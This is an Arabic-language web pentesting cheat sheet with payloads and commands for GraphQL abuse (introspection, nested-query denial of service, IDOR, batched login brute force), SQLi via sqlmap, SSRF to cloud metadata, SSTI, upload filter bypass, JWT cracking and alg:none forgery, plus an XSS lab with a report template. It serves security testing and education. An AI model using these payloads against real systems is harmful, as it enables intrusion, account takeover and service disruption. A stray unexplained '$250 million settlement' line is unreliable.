Step 1 — Schema Discovery & Endpoints

أولى خطوات فحص الـ GraphQL هي تحديد الرابط البرمجي له. أشهر المسارات الشائعة:

  • ✔ /graphql
  • ✔ /api/graphql
  • ✔ /v1/graphql
  • ✔ /query

Step 2 — Introspection Query Injection

إذا كانت الـ Introspection مفعلة، يمكنك سحب كامل المخطط. أرسل حمولة الاستعلام التالية:

{"query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { name kind fields { name } } } }"}

ماذا لو كانت مغلقة؟ نستخدم أداة Clairvoyance لتخمين المخطط يدوياً:

clairvoyance https://target.com/graphql -o schema.json

Step 3 — Query Abuse (Nested Queries)

استغلال العلاقات المتداخلة لطلب بيانات لا حصر لها، مما يتسبب في شلل الخادم:

query { author { posts { author { posts { author { name } } } } } }

Step 4 — GraphQL IDOR

الاستعلام المباشر عن حسابات أخرى عبر التلاعب بالمعرفات في الـ resolvers:

query { userProfile(id: 1002) { username email creditCardNumber } }

Step 5 — Batch Attacks (Rate Limit Bypass)

دمج مئات الطلبات داخل مصفوفة JSON لإرسالها دفعة واحدة وتجاوز القيود الزمنية لطلب البينات أو تخمين كلمات المرور:

[ {"query": "mutation { login(username:\"admin\", password:\"1111\") { token } }"}, {"query": "mutation { login(username:\"admin\", password:\"2222\") { token } }"}, {"query": "mutation { login(username:\"admin\", password:\"3333\") { token } }"} ]

💉 SQL Injection (SQLi)

منهجية كشف واستغلال ثغرات قواعد البيانات

💡 SQLi Overview & Detection

تسمح للمهاجمين بالتدخل في الاستعلامات التي يرسلها التطبيق لقاعدة البيانات.

  • ✔ Detection: حقن ' أو " ومراقبة أخطاء SQL أو التغيرات في الاستجابة (Blind SQLi).
  • ✔ Automation: sqlmap -u "https://target.com/item.php?id=1" --dbs --batch

📋 SQLi Types

  • ✔ Union-Based: دمج نتائج استعلامات إضافية مع الاستعلام الأصلي.
  • ✔ Error-Based: إجبار السيرفر على استخلاص البيانات عبر رسائل الخطأ.
  • ✔ Blind Time-Based: التحقق عبر إحداث تأخير زمني SLEEP(5).

📡 Server-Side Request Forgery (SSRF)

فحص المدخلات البرمجية التي تطلب روابط خارجية واستغلالها لقراءة الخواص الداخلية للشبكة

💡 SSRF Overview & Detection

تحدث عندما يقوم الخادم بجلب رابط خارجي يحدده المهاجم دون تعقيم للرابط.

  • ✔ Detection: حقن رابط خادم خارجي مثل Interact.sh أو رابط داخلي http://127.0.0.1:80/.
  • ✔ Metadata targets: استدعاء روابط السحابة العامة مثل AWS http://169.254.169.254/latest/meta-data/.

الأثر (Impact): تسوية قضائية بقيمة 250 مليون دولار.

💡 SSTI Detection Methodology

تبدأ الثغرة عندما يتم دمج مدخلات المستخدم مباشرة داخل محرك القوالب (Template Engine) بدلاً من تمريرها كبيانات آمنة.

لحقن العمليات الرياضية ورصد النتيجة:

  • ✔ حقن ${7*7} أو {% templatetag openvariable %}7*7{% templatetag closevariable %} في المدخلات.
  • ✔ إذا عادت الاستجابة بالرقم 49، فإن الخادم مصاب بـ SSTI مؤكدة.

📤 File Upload Exploits

🛠️ Bypassing Extensions Filters

طرق تخطي حظر رفع ملفات الـ PHP:

  • ✔ Alternative Extensions: رفع بصيغ بديلة مثل .phtml or .php5 or .phar.
  • ✔ Double Extensions: رفع باسم مثل image.png.php.
  • ✔ MIME-Type bypass: تعديل الـ Content-Type في الطلب إلى image/jpeg بدلاً من application/x-php.

Step 1 — Decode Token

يتكون الـ JWT من ثلاثة أجزاء مفصولة بنقاط (Header.Payload.Signature) مرمزة بـ Base64:

# Decoding header echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d # Decoding payload echo -n "eyJ1c2VySWQiOjEwMSwicm9sZSI6InVzZXIifQ" | base64 -d

Step 2 — Analyze Algorithm

البحث في الهيدر عن معامل "alg". هل هو متماثل (HS256) أم غير متماثل (RS256)؟ تأكد من وجود صلاحية تتيح تغييره.

Step 3 — Weak Secret Cracking

hashcat -m 16500 jwt_token.txt rockyou.txt # Or using jwt_tool jwt_tool jwt_token.txt -C -d rockyou.txt

Step 4 — None Algorithm Bypass

تغيير الـ Header لطلب تجاوز التوقيع:

{"alg": "none", "typ": "JWT"}

Lab 1: Reflected XSS Search Parameter

Difficulty: Easy | Category: Client-side

Target URL: http://vulnerable-lab.local/search.php?q=query
Attack Surface: Search Input reflection inside standard HTML body.
Tools Required: Web Browser DevTools.

Raw HTTP request / response:

GET /search.php?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E HTTP/1.1 Host: vulnerable-lab.local HTTP/1.1 200 OK Content-Type: text/html <div>Search results for: <img src=x onerror=alert(1)></div>

Methodology & Walkthrough

1. قم بحقن حمولة XSS أساسية مثل <img src=x onerror=alert(1)> في مربع البحث.
2. اضغط على زر Search.
3. سينعكس المدخل في المتصفح دون تعقيم، مما يتسبب في تشغيل سكريبت التنبيه.

Mitigation & Fix

يجب تفعيل تشفير الكيانات الخاصة بلغة HTML (HTML Entity Encoding) لجميع المدخلات المنعكسة قبل عرضها بالصفحة.

Draft Report Template:

**Title:** Reflected Cross-Site Scripting (XSS) on /search.php via q parameter **Severity:** Medium (CVSS: 6.1) **Description:** The application fails to properly sanitize the search query parameter 'q' before rendering it to the client browser, allowing remote execution of arbitrary JavaScript. **Impact:** Session Hijacking, Phishing attacks, client redirection.
